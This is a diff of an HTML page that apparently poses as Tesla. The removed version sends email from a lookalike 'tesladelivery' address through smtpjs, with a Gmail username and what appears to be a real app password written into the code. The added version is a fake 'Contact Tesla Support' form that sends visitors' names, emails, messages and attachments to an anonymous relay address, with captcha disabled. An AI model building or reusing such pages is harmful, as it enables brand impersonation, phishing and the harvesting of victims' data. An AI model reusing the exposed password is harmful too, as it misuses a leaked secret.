@@ -1,108 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Tesla Delivery Support Email</title>
-  <script src="https://smtpjs.com/v3/smtp.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 500px;
-      width: 100%;
-    }
-    h2 {
-      color: #cc0000;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-    input, textarea {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-    }
-    button {
-      background-color: #cc0000;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      width: 100%;
-      font-size: 16px;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 10px;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h2>Send Email from Tesla Delivery</h2>
-    <input id="to" type="email" placeholder="Recipient Email" required>
-    <input id="subject" type="text" placeholder="Subject" required>
-    <textarea id="body" placeholder="Type your message here..." rows="6" required></textarea>
-    <input id="attachment" type="file" />
-    <button onclick="sendEmail()">Send Email</button>
-    <div class="footer">Email sent from support@tesladelivery.anonaddy.com</div>
-  </div>
-
-  <script>
-    function sendEmail() {
-      const to = document.getElementById("to").value;
-      const subject = document.getElementById("subject").value;
-      const body = document.getElementById("body").value;
-      const fileInput = document.getElementById("attachment");
-
-      if (fileInput.files.length > 0) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          const base64 = e.target.result.split(",")[1];
-          const filename = fileInput.files[0].name;
-
-          Email.send({
-            Host: "smtp.gmail.com",
-            Username: "delivery.teslamotors.com@gmail.com",
-            Password: "oxfa hwqu upaw jcen",
-            To: to,
-            From: "support@tesladelivery.anonaddy.com",
-            Subject: subject,
-            Body: body,
-            Attachments: [
-              {
-                name: filename,
-                data: e.target.result
-              }
-            ]
-          }).then(msg => alert("✅ Email sent: " + msg));
-        };
-        reader.readAsDataURL(fileInput.files[0]);
-      } else {
-        Email.send({
-          Host: "smtp.gmail.com",
-          Username: "yourgmail@gmail.com",
-          Password: "your_app_password",
-          To: to,
-          From: "support@tesladelivery.anonaddy.com",
-          Subject: subject,
-          Body: body
-        }).then(msg => alert("✅ Email sent: " + msg));
+  <head>
+    <title>Tesla Email Form</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background: #f4f4f4;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
       }
-    }
-  </script>
-</body>
+      form {
+        background: white;
+        padding: 30px;
+        border-radius: 12px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        width: 90%;
+        max-width: 500px;
+      }
+      input, textarea {
+        width: 100%;
+        margin: 10px 0;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+      }
+      button {
+        background-color: #cc0000;
+        color: white;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        width: 100%;
+        font-size: 16px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <form action="https://formsubmit.co/support@tesladelivery.anonaddy.com" method="POST" enctype="multipart/form-data">
+      <h2>Contact Tesla Support</h2>
+      <input type="text" name="name" placeholder="Your Name" required>
+      <input type="email" name="email" placeholder="Your Email" required>
+      <input type="text" name="_subject" placeholder="Subject" required>
+      <textarea name="message" placeholder="Your message here..." rows="5" required></textarea>
+      <input type="file" name="attachment">
+      <button type="submit">Send Message</button>
+
+      <!-- Optional settings -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="box">
+      <input type="hidden" name="_next" value="https://thankyoupage.com">
+    </form>
+  </body>
 </html>
